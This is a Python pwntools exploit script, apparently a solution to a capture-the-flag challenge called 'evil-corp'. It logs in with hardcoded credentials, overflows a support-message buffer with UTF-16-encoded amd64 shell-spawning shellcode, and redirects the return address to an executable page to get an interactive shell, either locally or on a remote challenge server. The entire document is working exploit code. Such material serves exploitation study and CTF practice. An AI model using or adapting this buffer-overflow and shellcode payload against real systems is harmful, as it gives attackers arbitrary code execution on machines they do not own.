#!/usr/bin/env python3

from pwn import *
import codecs

exe = ELF("./evil-corp")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, """
                          break *ContactSupport+0x50
                          """)
    else:
        r = remote("94.237.58.148", 59126)

    return r


def login():
    r.sendlineafter(b"Username: ", b"eliot")
    r.sendlineafter(b"Password: ", b"4007")


def contact_support(payload: bytes):
    r.sendlineafter(b">> ", b"2")
    r.sendlineafter(b"if necessary.", payload)


def main():
    r = conn()

    # 0x11000 address is an executable area so we can execute shellcode in it
    # Since at 0x10000 there's "SupportMsg", we might overflow it and write shellcode directly
    # to the next mem. page (executable).
    login()

    # `2048 + 2 = 2050` so the shellcode starts at an address without null bytes
    payload  = "A" * 2050 + asm(shellcraft.amd64.linux.sh()).decode("utf-16")

    # More padding (conformed with the shellcode just in case)
    payload += (b"\x3c" * ((4002 - len(payload)) * 2)).decode("utf-16")

    # Return address ("\U..." for 4 bytes unicode + "\x00" to remove the newline at the end)
    payload += "\U00011000" + "\x00" 

    contact_support(payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
